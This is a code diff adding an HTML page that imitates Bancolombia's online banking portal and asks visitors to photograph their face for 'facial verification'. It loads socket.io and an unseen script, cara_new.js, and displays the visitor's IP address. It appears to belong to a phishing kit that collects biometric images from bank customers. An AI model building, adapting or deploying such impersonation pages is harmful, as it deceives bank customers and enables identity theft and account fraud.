@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles_new.css">
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="cara_new.js" defer></script>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div class="auth-box">
+                <h2>Verificación Facial</h2>
+                <p>Por favor, toma una foto clara de tu rostro.</p>
+                
+                <div class="camera-container">
+                    <video id="video" autoplay playsinline muted></video>
+                    <canvas id="canvas"></canvas>
+                </div>
+                
+                <div class="button-container">
+                    <button type="button" id="captureBtn" class="btn-iniciar active">Tomar Foto</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="help-links">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+                </div>
+                <div class="footer-right">
+                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
+                    <p class="datetime" id="datetime">Cargando fecha y hora...</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
+    </div>
+</body>
+</html>
